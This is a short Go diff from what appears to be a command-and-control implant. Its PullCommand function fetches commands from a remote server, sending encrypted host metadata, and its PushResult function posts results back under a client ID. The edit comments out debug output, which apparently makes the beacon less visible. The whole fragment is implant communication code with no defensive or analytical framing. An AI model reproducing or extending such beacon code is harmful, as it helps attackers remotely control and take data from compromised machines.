@@ -193,12 +193,13 @@ func FirstBlood() bool {
 func PullCommand() *req.Resp {
 	resp := HttpGet(config.GetUrl, encryptedMetaInfo)
 	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
-	fmt.Println(resp)
+	// fmt.Println(resp)
 	return resp
 }
 
 func PushResult(b []byte) *req.Resp {
 	url := config.PostUrl + "?csrf=" +strconv.Itoa(clientID)
+	// fmt.Println(url)
 	resp := HttpPost(url, b)
 	fmt.Printf("pushresult: %v\n", resp.Request().URL)
 	return resp
